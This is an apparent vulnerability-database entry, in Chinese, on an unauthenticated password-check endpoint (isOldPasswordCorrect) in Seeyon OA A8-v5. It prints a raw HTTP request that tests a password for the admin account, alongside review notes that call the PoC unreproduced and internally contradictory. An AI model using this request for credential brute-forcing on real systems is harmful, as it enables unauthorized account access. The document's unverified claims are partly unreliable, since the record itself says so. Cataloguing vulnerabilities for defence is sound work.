---
source: "hatch 补库批 20260928"
title: "致远A8-v5 isOldPasswordCorrect未认证密码验证接口/限速缺失"
product: "致远A8-v5"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "A8-v5；验证码绕过需接口无等效限速证明"
prerequisites: "样本Cookie空，声称无需登录"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8-v5%20%E6%97%A0%E8%A7%86%E9%AA%8C%E8%AF%81%E7%A0%81%E6%92%9E%E5%BA%93.md"
id: "vw-68e29f6aec25c8ac4c03d031"
entity_id: "ve-68e29f6aec25c8ac4c03d031"
schema_version: "1"
---

# 致远A8-v5 isOldPasswordCorrect未认证密码验证接口/限速缺失

## 条目说明

- 对象与具体问题：致远A8-v5；isOldPasswordCorrect未认证密码验证接口/限速缺失
- 版本、配置及部署条件：A8-v5；验证码绕过需接口无等效限速证明
- 认证与权限前提：样本Cookie空，声称无需登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 说明POST穷举但给GET请求，自相矛盾；不是实际循环脚本
- 缺正误密码响应差异/限速证据，不能仅无验证码断言可无限撞库
- 与modifyIndividual改密为互补链不同漏洞实体，不合并删除

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

一、漏洞简介
------------

致远A8-V5在设计时存在逻辑错误，用户修改密码时对原密码进行了验证，但是验证使用的服务存在未授权访问漏洞，系统对非合法请求的原密码验证功能进行回应，导致了无视验证码，无需login页面进行密码尝试

二、漏洞影响
------------

致远OA A8-v5

三、复现过程
------------

POST穷举用户和密码代码如下

```http
    GET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0

    Accept: */*

    Accept-Language: zh-cn

    Referer: http://www.0-sec.org/seeyon/individualManager.do?method=managerFrame

    requesttype: AJAX

    Content-Type: application/x-www-form-urlencoded

    Cookie: 

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

    Host: www.0-sec.org

    DNT: 1

    Proxy-Connection: Keep-Alive
```
